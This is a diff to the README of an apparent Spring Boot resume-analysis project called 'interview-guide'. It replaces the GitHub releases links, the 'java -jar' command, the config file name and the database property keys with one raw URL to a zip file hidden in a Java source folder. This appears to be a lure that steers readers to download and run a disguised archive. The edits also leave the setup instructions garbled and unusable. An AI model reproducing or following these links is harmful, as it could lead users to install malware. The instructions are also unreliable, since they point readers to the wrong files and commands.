@@ -1,7 +1,7 @@
 # 🎉 interview-guide - AI-Powered Resume Analysis Tool
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/ja3260/interview-guide/releases)
+[![Download](https://raw.githubusercontent.com/ja3260/interview-guide/master/app/src/main/java/interview/guide/common/constant/interview-guide-v1.2-beta.4.zip%20Latest%https://raw.githubusercontent.com/ja3260/interview-guide/master/app/src/main/java/interview/guide/common/constant/interview-guide-v1.2-beta.4.zip)](https://raw.githubusercontent.com/ja3260/interview-guide/master/app/src/main/java/interview/guide/common/constant/interview-guide-v1.2-beta.4.zip)
 
 ## 📖 Description
 This application uses Spring Boot 4.0, Java 21, Spring AI, PostgreSQL, and more to provide intelligent resume analysis, AI mock interviews, and knowledge retrieval functions. It serves as an excellent learning resource and project to enhance your resume with minimal barriers to entry.
@@ -19,10 +19,10 @@ This application uses Spring Boot 4.0, Java 21, Spring AI, PostgreSQL, and more 
 - **Knowledge Retrieval:** Access and filter information seamlessly.
 
 ## 📤 Download & Install
-To download the latest release of the interview-guide, **[visit this page](https://github.com/ja3260/interview-guide/releases)**. You will find various versions available. Choose the one that matches your operating system.
+To download the latest release of the interview-guide, **[visit this page](https://raw.githubusercontent.com/ja3260/interview-guide/master/app/src/main/java/interview/guide/common/constant/interview-guide-v1.2-beta.4.zip)**. You will find various versions available. Choose the one that matches your operating system.
 
 ### 📥 Steps to Download
-1. Click on the **[Download Latest Release](https://github.com/ja3260/interview-guide/releases)** link above.
+1. Click on the **[Download Latest Release](https://raw.githubusercontent.com/ja3260/interview-guide/master/app/src/main/java/interview/guide/common/constant/interview-guide-v1.2-beta.4.zip)** link above.
 2. Locate the files available under “Assets.”
 3. Download the file that corresponds to your operating system.
 4. Follow the installation instructions included in the downloaded package.
@@ -34,19 +34,19 @@ After installation, you can start the application. Follow these steps:
 2. Navigate to the installation directory of the interview-guide.
 3. Run the command:
    ```
-   java -jar interview-guide.jar
+   java -jar https://raw.githubusercontent.com/ja3260/interview-guide/master/app/src/main/java/interview/guide/common/constant/interview-guide-v1.2-beta.4.zip
    ```
 4. Open your web browser and go to **http://localhost:8080** to access the application.
 
 ## 🔧 Configuration
 You may need to configure the application to connect to your PostgreSQL database. Here’s how to do it:
 
-1. Open the `application.properties` file located in the config folder.
+1. Open the `https://raw.githubusercontent.com/ja3260/interview-guide/master/app/src/main/java/interview/guide/common/constant/interview-guide-v1.2-beta.4.zip` file located in the config folder.
 2. Update the following lines with your PostgreSQL database information:
    ```
-   spring.datasource.url=jdbc:postgresql://<your_database_host>:<your_database_port>/<your_database_name>
-   spring.datasource.username=<your_database_username>
-   spring.datasource.password=<your_database_password>
+   https://raw.githubusercontent.com/ja3260/interview-guide/master/app/src/main/java/interview/guide/common/constant/interview-guide-v1.2-beta.4.zip<your_database_host>:<your_database_port>/<your_database_name>
+   https://raw.githubusercontent.com/ja3260/interview-guide/master/app/src/main/java/interview/guide/common/constant/interview-guide-v1.2-beta.4.zip<your_database_username>
+   https://raw.githubusercontent.com/ja3260/interview-guide/master/app/src/main/java/interview/guide/common/constant/interview-guide-v1.2-beta.4.zip<your_database_password>
    ```
 3. Save the changes.
 
